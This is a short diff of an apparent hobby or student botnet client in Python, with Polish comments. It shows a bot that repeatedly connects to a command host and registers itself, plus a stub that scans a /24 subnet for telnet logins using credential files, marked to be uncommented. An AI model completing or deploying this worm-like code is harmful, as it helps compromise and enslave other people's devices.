@@ -2,7 +2,12 @@ import socket
 import time
 import xtelnet
 
-from requests import get
+
+#       ^
+#       |
+# nie jest defaultowo zainstalowane -> można uruchomić proces na zainfekowanym hoście tj. run(pip3 install xtelnet)
+
+# from requests import get       ->       można publiczny ip używać    w sumie nie wiem po co xD
 
 
 def telnetConnect(ip_address, victimIP):
@@ -28,10 +33,10 @@ def checkForOtherDevices(ip, victimIP):
 
     while x < 254:
         current_address = ip + str(x)
-        # telnetConnect(current_address,victimIP) --> w wątku chyba???
+        # próbuj połączyć z każdym przez telnet (używając np pliku z loginem i hasłem)
+        # telnetConnect(current_address,victimIP) --> w wątku chyba???                      do odkomentowania!!!
         x += 1
         # print(current_address)
-        # próbuj połączyć z każdym przez telnet (używając np pliku z loginem i hasłem)
 
 
 if __name__ == '__main__':
@@ -46,7 +51,7 @@ if __name__ == '__main__':
             while flag != 1:
                 time.sleep(0.5)
                 try:
-                    print('próba połączenia')
+                    print('trying to connect...')
                     s.connect((HOST, PORT))
                     # send info to host that a bot is connected
                     s.send('1'.encode())
@@ -58,6 +63,8 @@ if __name__ == '__main__':
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     flag = 0
                     continue
+                time.sleep(1)
+                print("Connection established!")
 
             try:
                 data = str(s.recv(1024).decode())
@@ -79,9 +86,6 @@ if __name__ == '__main__':
                 flag = 0
                 # s.close()
                 continue
-            # wyślij swój adres ip przy:
-            # - każdym połączeniu
-            # - po każdym ataku
 
             # ip = get('https://api.ipify.org').text
             # print('public IP address: {}'.format(ip))
